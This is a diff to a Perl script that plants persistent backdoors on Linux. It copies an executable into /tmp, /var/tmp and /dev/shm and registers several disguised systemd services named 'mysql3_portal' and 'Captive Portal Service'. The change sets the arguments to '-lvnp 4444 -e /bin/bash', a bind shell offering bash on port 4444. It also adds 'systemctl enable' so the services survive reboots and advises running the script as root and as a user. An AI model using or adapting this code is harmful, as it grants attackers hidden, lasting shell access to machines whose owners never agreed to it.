@@ -15,12 +15,13 @@ Run the script with the desired executable with the arguments specified in the
 $executable_args variable. This script will create multiple system and user
 services with the executable being copied to multiple directories. If this is
 not desired, run the command as an unprivileged user and remove the directories
-in the @cp_dirs variables.
+in the @cp_dirs variables. Run it with AND without sudo to install services as
+system and as a user.
 
 =cut
 
 my @cp_dirs = qw(/var/tmp /tmp /dev/shm);
-my $executable_args = 'localhost 1000 -e /bin/bash';
+my $executable_args = '-lvnp 4444 -e /bin/bash';
 my $service_name = 'mysql3_portal';
 
 if (@ARGV < 1) {
@@ -35,15 +36,16 @@ if (! -x $exec_file) {
 
 # copy executable to other directories
 my ($exec_bname) = $exec_file =~ /([^\/]+)$/;
+$exec_bname .= time();
 for my $dir (@cp_dirs) {
-	system("cp", $exec_file, "$dir/$exec_bname") == 0 or print "copy to $dir failed: $!";
+	system("cp", $exec_file, "$dir/${exec_bname}") == 0 or print "copy to $dir failed: $!";
 }
 
 # add to system services
-if (-w '/etc/systemd/service') {
+if (-w '/etc/systemd/system') {
 	my $i = 0;
 	for my $dir (@cp_dirs) {
-		open(my $fh, '>', "/etc/systemd/service/${service_name}_${i}.service") or do {
+		open(my $fh, '>', "/etc/systemd/system/${service_name}_${i}.service") or do {
 			print "could not open service file: $!";
 			next;
 		};
@@ -53,7 +55,7 @@ if (-w '/etc/systemd/service') {
 Description=Captive Portal Service
 
 [Service]
-ExecStart=$dir/$exec_bname $executable_args
+ExecStart=$dir/${exec_bname} ${executable_args}
 
 [Install]
 WantedBy=multi-user.target
@@ -61,12 +63,14 @@ END
 		print $fh $service_text;
 		close $fh;
 
+		print "enabling/starting copy $i\n";
+		`systemctl enable ${service_name}_${i}.service`;
 		`systemctl start ${service_name}_${i}.service`;
 
 		$i++;
 	}
 
-	open(my $fh, '>', "/etc/systemd/service/${service_name}.service") or do {
+	open(my $fh, '>', "/etc/systemd/system/${service_name}.service") or do {
 		print "could not open service file: $!";
 		next;
 	};
@@ -84,6 +88,8 @@ END
 	print $fh $service_text;
 	close $fh;
 
+	print "enabling/starting main\n";
+	`systemctl enable ${service_name}.service`;
 	`systemctl start ${service_name}.service`;
 }
 
@@ -101,7 +107,7 @@ if (! -d "$ENV{HOME}/.config/systemd/user/") {
 }
 
 # add to user services
-if (-w "$ENV{HOME}/.config/systemd/user/") {
+if ($ENV{HOME} ne '/root' && -w "$ENV{HOME}/.config/systemd/user/") {
 	my $i = 0;
 	for my $dir (@cp_dirs) {
 		open(my $fh, '>',  "$ENV{HOME}/.config/systemd/user/${service_name}_${i}-u.service") or do {
@@ -122,6 +128,8 @@ END
 		print $fh $service_text;
 		close $fh;
 
+		print "enabling/starting user copy $i\n";
+		`systemctl enable --user ${service_name}_${i}-u.service`;
 		`systemctl start --user ${service_name}_${i}-u.service`;
 
 		$i++;
@@ -145,5 +153,7 @@ END
 	print $fh $service_text;
 	close $fh;
 
+	print "enabling/starting user main\n";
+	`systemctl enable --user ${service_name}-u.service`;
 	`systemctl start --user ${service_name}-u.service`;
 }
